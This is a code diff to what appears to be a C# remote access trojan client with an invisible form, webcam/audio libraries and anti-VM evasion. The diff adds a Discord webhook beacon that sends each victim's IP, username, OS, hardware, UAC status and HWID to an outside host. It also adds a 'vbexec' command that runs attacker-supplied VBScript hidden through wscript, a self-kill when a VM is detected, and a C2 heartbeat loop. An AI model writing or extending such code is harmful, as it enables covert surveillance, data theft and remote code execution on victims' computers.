@@ -11,6 +11,7 @@ using System.Windows.Forms;
 using AForge.Video;
 using AForge.Video.DirectShow;
 using NAudio.Wave;
+using System.Diagnostics;
 
 namespace Client
 {
@@ -46,6 +47,49 @@ namespace Client
             Application.Run(new InvisibleForm());
         }
 
+        private static async Task SendToDiscordWebhookAsync(string webhookUrl, JObject clientInfo)
+        {
+            try
+            {
+                var embed = new JObject
+                {
+                    ["title"] = "🟢 New Client Connected",
+                    ["color"] = 65280, // green
+                    ["fields"] = new JArray
+            {
+                new JObject { ["name"] = "IP", ["value"] = $"`{clientInfo["ip"]}`", ["inline"] = true },
+                new JObject { ["name"] = "Username", ["value"] = $"`{clientInfo["username"]}`", ["inline"] = true },
+                new JObject { ["name"] = "OS", ["value"] = $"`{clientInfo["os"]}`", ["inline"] = false },
+                new JObject { ["name"] = "CPU", ["value"] = $"`{clientInfo["cpu"]}`", ["inline"] = false },
+                new JObject { ["name"] = "GPU", ["value"] = $"`{clientInfo["gpu"]}`", ["inline"] = false },
+                new JObject { ["name"] = "UAC Status", ["value"] = $"`{clientInfo["uac"]}`", ["inline"] = true },
+                new JObject { ["name"] = "HWID", ["value"] = $"`{clientInfo["hwid"]}`", ["inline"] = false }
+            },
+                    ["footer"] = new JObject
+                    {
+                        ["text"] = "Client connected at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+                    }
+                };
+
+                var payload = new JObject
+                {
+                    ["embeds"] = new JArray { embed }
+                };
+
+                using (var httpClient = new System.Net.Http.HttpClient())
+                {
+                    var content = new System.Net.Http.StringContent(payload.ToString(), System.Text.Encoding.UTF8, "application/json");
+                    await httpClient.PostAsync(webhookUrl, content);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Failed to send to Discord webhook: " + ex.Message);
+            }
+        }
+
+
+
         static async Task RunClientAsync()
         {
             if (GClass.IsTrue("antivm"))
@@ -54,10 +98,32 @@ namespace Client
                 Console.WriteLine(res.ToString());
                 if (res != VirtualizationDetection.VmType.None)
                 {
-                    Application.Exit();
+                    // killing myself!!!!!!!!!!!!!!!!
+                    Process.GetCurrentProcess().Kill();
                 }
                 ;
                 Console.WriteLine("we're continuing");
+            }
+
+            var info = new JObject
+            {
+                ["msg"] = "alive",
+                ["ip"] = await GClass.GetIp(),
+                ["username"] = DeviceInfo.GetUsername(),
+                ["os"] = DeviceInfo.GetOSInfo(),
+                ["cpu"] = DeviceInfo.GetCPUInfo(),
+                ["gpu"] = DeviceInfo.GetGPUInfo(),
+                ["uac"] = DeviceInfo.GetUACStatus(),
+                ["hwid"] = DeviceInfo.GetHWID(),
+            };
+
+            if (GClass.IsTrue("discord") && config["webhook"] != null)
+            {
+                string webhookUrl = (string)config["webhook"];
+                Task.Run(async () =>
+                {
+                    await SendToDiscordWebhookAsync(webhookUrl, info);
+                });
             }
 
             var client = new LazyServerClient();
@@ -73,17 +139,11 @@ namespace Client
 
             var ss = ScreenCapture.CaptureScreenWithCursor();
 
-            await client.SendFileBytesWithMeta(ss, new JObject
-            {
-                ["msg"] = "alive",
-                ["ip"] = await GClass.GetIp(),
-                ["username"] = DeviceInfo.GetUsername(),
-                ["os"] = DeviceInfo.GetOSInfo(),
-                ["cpu"] = DeviceInfo.GetCPUInfo(),
-                ["gpu"] = DeviceInfo.GetGPUInfo(),
-                ["uac"] = DeviceInfo.GetUACStatus(),
-                ["hwid"] = DeviceInfo.GetHWID(),
-            }.ToString());
+            
+
+            await client.SendFileBytesWithMeta(ss, info.ToString());
+            // Check if Discord notification is enabled
+            
 
             client.MessageReceived += async (s, e) =>
             {
@@ -183,6 +243,34 @@ namespace Client
                                 }.ToString());
                             }
                             break;
+                        case "vbexec":
+                            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".vbs");
+
+                            try
+                            {
+                                File.WriteAllText(tempPath, (string)message["body"]);
+
+                                ProcessStartInfo startInfo = new ProcessStartInfo()
+                                {
+                                    FileName = "wscript.exe",
+                                    Arguments = $"\"{tempPath}\"",
+                                    UseShellExecute = false,
+                                    CreateNoWindow = true
+                                };
+
+                                using (Process process = Process.Start(startInfo))
+                                {
+                                    process.WaitForExit();
+                                }
+                            }
+                            finally
+                            {
+                                if (File.Exists(tempPath))
+                                {
+                                    try { File.Delete(tempPath); } catch { /* ignore if locked */ }
+                                }
+                            }
+                            break;
                     }
                 }
                 catch
@@ -190,6 +278,28 @@ namespace Client
                     // Optional: handle errors
                 }
             };
+            // Start heartbeat loop to keep connection alive
+            _ = Task.Run(async () =>
+            {
+                while (true)
+                {
+                    try
+                    {
+                        if (client != null && client.IsConnected)
+                        {
+                            var payload = System.Text.Encoding.UTF8.GetBytes("ping");
+                            await client.SendHeartbeat(payload);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Heartbeat error: {ex.Message}");
+                    }
+
+                    await Task.Delay(30000); // every 30 seconds
+                }
+            });
+
         }
 
         static async Task StartScreenshotLoopAsync(LazyServerClient client, JObject message)
